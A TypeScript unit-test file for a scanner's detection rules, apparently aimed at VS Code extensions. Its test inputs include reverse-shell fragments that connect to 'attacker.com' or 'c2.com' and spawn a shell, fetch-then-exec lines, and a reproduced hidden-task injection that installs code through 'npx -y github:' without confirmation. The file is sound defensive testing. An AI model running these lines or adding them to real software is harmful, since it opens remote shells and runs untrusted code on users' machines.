/**
 * Unit tests for Source Detection Rules
 */

import { expect } from 'chai';
import { SOURCE_RULES, getAllRules, getRuleById } from '../../detection/source-rules';
import { SeverityLevel } from '../../lib/events/sec-events';

suite('SourceRules Tests', () => {
  suite('Rule Registry', () => {
    test('should have rules defined', () => {
      expect(SOURCE_RULES).to.be.an('array');
      expect(SOURCE_RULES.length).to.be.greaterThan(0);
    });

    test('all rules should have required properties', () => {
      SOURCE_RULES.forEach((rule) => {
        expect(rule.id).to.be.a('string').and.have.length.greaterThan(0);
        expect(rule.name).to.be.a('string').and.have.length.greaterThan(0);
        expect(rule.description).to.be.a('string').and.have.length.greaterThan(0);
        expect(rule.severity).to.exist;
        expect(rule.detect).to.be.a('function');
      });
    });

    test('all rules should have unique IDs', () => {
      const ids = SOURCE_RULES.map((r) => r.id);
      expect(new Set(ids).size).to.equal(ids.length);
    });

    test('getRuleById should return matching rule', () => {
      const rule = getRuleById('download_and_execute');
      expect(rule).to.exist;
      expect(rule!.id).to.equal('download_and_execute');
    });

    test('getRuleById should return undefined for unknown ID', () => {
      expect(getRuleById('non_existent')).to.be.undefined;
    });

    test('getAllRules should return a copy', () => {
      const rules = getAllRules();
      expect(rules).to.deep.equal(SOURCE_RULES);
      expect(rules).to.not.equal(SOURCE_RULES);
    });
  });

  suite('download_and_execute rule', () => {
    const rule = () => SOURCE_RULES.find((r) => r.id === 'download_and_execute')!;

    test('should detect fetch + exec combination', () => {
      expect(rule().detect("fetch('http://x.com/p').then(r=>exec(r))")).to.be.true;
    });

    test('should detect https.get + spawn combination', () => {
      expect(rule().detect("https.get(url, res => { spawn('sh', ['-c', data]) })")).to.be.true;
    });

    test('should NOT fire on fetch alone', () => {
      expect(rule().detect("fetch('https://api.example.com/data').then(r => r.json())")).to.be.false;
    });

    test('should NOT fire on exec alone', () => {
      expect(rule().detect("exec('ls -la')")).to.be.false;
    });
  });

  suite('reverse_shell rule', () => {
    const rule = () => SOURCE_RULES.find((r) => r.id === 'reverse_shell')!;

    test('should detect net.Socket + /bin/sh string literal', () => {
      expect(
        rule().detect(
          "const s = new net.Socket(); s.connect(4444, 'attacker.com', () => spawn('/bin/sh', [], {stdio:[s,s,s]}))",
        ),
      ).to.be.true;
    });

    test('should detect net.createConnection + /bin/bash string literal', () => {
      expect(rule().detect("net.createConnection(4444, host, cb); spawn('/bin/bash',['-i'])")).to.be.true;
    });

    test('should detect cmd.exe shell binary', () => {
      expect(rule().detect("new net.Socket().connect(4444,'c2.com'); exec('cmd.exe')")).to.be.true;
    });

    test('should detect powershell shell binary', () => {
      expect(rule().detect("net.connect(4444,'host'); spawn('powershell.exe',[])")).to.be.true;
    });

    test('should NOT fire on net.Socket alone', () => {
      expect(rule().detect("const s = new net.Socket(); s.connect(80, 'example.com')")).to.be.false;
    });

    test('should NOT fire on LSP pattern: TCP socket + spawn of language server binary', () => {
      // False positive that the old exec/spawn rule triggered: a language server
      // extension that opens a TCP connection to its server and also spawns it.
      expect(rule().detect("net.createConnection(6009, 'localhost', () => {}); spawn('node', ['server.js'])")).to.be
        .false;
    });

    test('should NOT fire on debug adapter pattern: TCP socket + spawn of python', () => {
      expect(rule().detect("net.connect(5678, 'localhost'); spawn('python', ['-m', 'debugpy'])")).to.be.false;
    });
  });

  suite('eval_dynamic_payload rule', () => {
    const rule = () => SOURCE_RULES.find((r) => r.id === 'eval_dynamic_payload')!;

    test('should detect eval(atob(...))', () => {
      expect(rule().detect("eval(atob('SGVsbG8='))")).to.be.true;
    });

    test('should detect eval(Buffer.from(...))', () => {
      expect(rule().detect("eval(Buffer.from(encoded,'base64').toString())")).to.be.true;
    });

    test('should detect new Function(atob(...))', () => {
      expect(rule().detect('new Function(atob(payload))()')).to.be.true;
    });

    test('should NOT fire on plain eval', () => {
      expect(rule().detect('eval(userInput)')).to.be.false;
    });
  });

  suite('detached_unref_pattern rule', () => {
    const rule = () => SOURCE_RULES.find((r) => r.id === 'detached_unref_pattern')!;

    test('should detect detached:true + .unref()', () => {
      expect(rule().detect("spawn('payload', [], { detached: true, stdio: 'ignore' }).unref()")).to.be.true;
    });

    test('should NOT fire on detached alone', () => {
      expect(rule().detect("spawn('cmd', [], { detached: true })")).to.be.false;
    });

    test('should NOT fire on .unref() alone', () => {
      expect(rule().detect('someProcess.unref()')).to.be.false;
    });
  });

  suite('stealth_task_remote_install rule (nx-console TTP)', () => {
    const rule = () => SOURCE_RULES.find((r) => r.id === 'stealth_task_remote_install')!;

    test('rule should exist with HIGH severity', () => {
      const r = rule();
      expect(r).to.exist;
      expect(r.severity).to.equal(SeverityLevel.HIGH);
    });

    test('should detect hidden task + npx -y github: (minified form, nx-console sample)', () => {
      // Mirrors the minified injection found in nrwl.angular-console 18.95.0 main.js
      const injected =
        'let n=`npx -y github:nrwl/nx#558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2`,' +
        'i=new U0.Task({type:"nx"},U0.TaskScope.Workspace,"install-mcp-extension","nx",' +
        'new U0.ShellExecution(n,{cwd:e}));i.presentationOptions.focus=!1';
      expect(rule().detect(injected)).to.be.true;
    });

    test('should detect hidden task + npx --yes github: (unminified form)', () => {
      const code = ['task.presentationOptions.focus = false;', 'const cmd = `npx --yes github:org/repo#abc123`;'].join(
        '\n',
      );
      expect(rule().detect(code)).to.be.true;
    });

    test('should NOT fire when focus suppression is absent', () => {
      const code = 'const cmd = `npx -y github:org/repo#abc`; executeTask(cmd);';
      expect(rule().detect(code)).to.be.false;
    });

    test('should NOT fire when npx github: is absent', () => {
      const code = 'task.presentationOptions.focus = false; exec("npm install some-package");';
      expect(rule().detect(code)).to.be.false;
    });

    test('should NOT fire when auto-confirm flag is absent', () => {
      const code = ['task.presentationOptions.focus = false;', 'const cmd = `npx github:org/repo`;'].join('\n');
      expect(rule().detect(code)).to.be.false;
    });

    test('should NOT fire on legitimate hidden task without remote install', () => {
      const code = [
        'task.presentationOptions.focus = false;',
        'task.presentationOptions.reveal = TaskRevealKind.Silent;',
        'vscode.tasks.executeTask(task);',
      ].join('\n');
      expect(rule().detect(code)).to.be.false;
    });
  });
});
